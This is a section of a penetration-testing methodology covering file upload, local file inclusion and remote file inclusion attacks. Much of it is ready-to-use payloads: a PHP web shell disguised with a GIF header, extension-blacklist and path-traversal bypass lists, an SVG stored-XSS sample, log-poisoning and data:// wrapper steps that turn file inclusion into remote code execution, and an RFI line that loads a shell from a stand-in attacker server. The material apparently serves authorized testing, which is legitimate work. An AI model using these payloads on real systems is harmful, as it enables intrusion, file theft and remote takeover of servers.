# 9. File Upload / LFI / RFI (only if any such feature exists)

**Where this applies:** resume/CV upload forms, image upload (profile/comment attachments), "import from file" features, any parameter that looks like it loads a template/page/language file (`?page=`, `?template=`, `?lang=`, `?file=`).

## File Upload
### Test checklist
- [ ] Does it accept `.php`, `.asp`, `.jsp`, `.phtml` disguised as an image (double extension: `shell.php.jpg`)?
- [ ] Does it check `Content-Type` only (easily spoofed) rather than actual file content?
- [ ] Does it check magic bytes/extension only, not both?
- [ ] SVG upload \u2014 can it contain `<script>` (stored XSS via SVG)?
- [ ] Is the upload directory predictable and directly web-accessible?
- [ ] Null byte / path traversal in filename: `shell.php%00.jpg`, `../../shell.php`

**Linux**
```
# Create a polyglot/test payload
echo '<?php echo "test"; ?>' > shell.php.jpg
curl -F "file=@shell.php.jpg" https://target.com/upload
# Burp Suite Intruder for extension/content-type fuzzing is far more reliable than manual curl here
```

**Windows**
```
"<?php echo 'test'; ?>" | Out-File -Encoding ascii shell.php.jpg
Invoke-WebRequest -Uri https://target.com/upload -Method Post -InFile shell.php.jpg -ContentType "multipart/form-data"
# (Burp Suite / ZAP recommended here too, cross-platform)
```

## Local File Inclusion (LFI)
```
?page=../../../../etc/passwd                       # Linux target
?page=....//....//....//etc/passwd                 # filter bypass
?page=php://filter/convert.base64-encode/resource=index.php   # PHP wrapper, source disclosure
?page=..\..\..\..\windows\win.ini                  # Windows target
```

## Remote File Inclusion (RFI)
```
?page=http://your-server.com/shell.txt
```
Only works if `allow_url_include` is on (rare/legacy PHP configs) \u2014 check response for any sign the remote content was fetched/executed.

**Kali tooling**
```
ffuf -u "https://target.com/page?file=FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -mr "root:"
fimap -u "https://target.com/page?file=test"
```
**Windows:** ffuf.exe runs natively the same way; fimap via Python.

**Impact framing:** unrestricted file upload leading to code execution = critical; confirmed LFI reading sensitive files = high-critical; RFI with code execution = critical.

## Advanced / Bypass Techniques

### Extension blacklist bypass list (most filters block a short, predictable set)
```
shell.pHp          # case variation \u2014 case-insensitive filesystems but case-sensitive blacklist
shell.php5
shell.phtml
shell.pht
shell.phar
shell.php.         # trailing dot, stripped by some OSes after the blacklist check runs
shell.php%20       # trailing space, same idea
shell.php::$DATA   # NTFS alternate data stream trick, bypasses extension check on IIS
shell.asp;.jpg     # semicolon trick, legacy IIS treats everything after ; as ignored
```

### Content-Type / magic-byte spoofing (bypass checks that only look at one or the other)
```
# Prefix a real GIF header before your PHP payload \u2014 passes magic-byte checks that only read the first bytes
printf 'GIF89a;\n<?php system($_GET["c"]); ?>' > shell.php.gif
# then rename/upload as .php if extension filtering is weak, or rely on a local file inclusion elsewhere to execute the .gif as PHP
```
```
# Kali \u2014 automate the fuzz across many bypass variants at once with Burp Intruder, or:
for ext in pHp php5 phtml pht phar "php." "php%20"; do
  curl -s -F "file=@shell.$ext" https://target.com/upload -o /dev/null -w "$ext -> %{http_code}\n"
done
```

### SVG-based stored XSS (often slips past "image upload" filters since SVG IS technically an image format)
```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
  <script type="text/javascript">alert(document.domain)</script>
</svg>
```

### LFI filter bypass variants (when `../` is stripped once)
```
....//....//....//etc/passwd              # survives a single-pass ../ -> '' replacement
..%2f..%2f..%2fetc%2fpasswd                # URL-encoded traversal
..%252f..%252f..%252fetc%252fpasswd        # double-encoded, bypasses WAFs that decode only once
/var/www/html/../../../etc/passwd          # absolute-path prefix can bypass naive "must start with /var/www" checks
php://filter/convert.base64-encode/resource=../../../etc/passwd
php://filter/read=string.rot13/resource=index.php    # alternative filter chain if base64 is specifically blocked
```

### LFI to RCE escalation paths (when plain file read isn't enough)
```
# Log poisoning: inject PHP into a log file via User-Agent, then include the log
curl -A "<?php system(\$_GET['c']); ?>" https://target.com/
curl "https://target.com/page?file=../../../../var/log/apache2/access.log&c=id"

# PHP session file inclusion (if session.save_path is predictable/includable)
# PHP wrapper RCE if allow_url_include is on (rare, legacy configs only):
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==&c=id
```

**Resources:** PayloadsAllTheThings Upload Insecure Files & File Inclusion sections (the most complete bypass-list references), HackTricks LFI/RFI and File Upload pages, OWASP Testing Guide (Testing for File Inclusion / Unrestricted File Upload chapters).
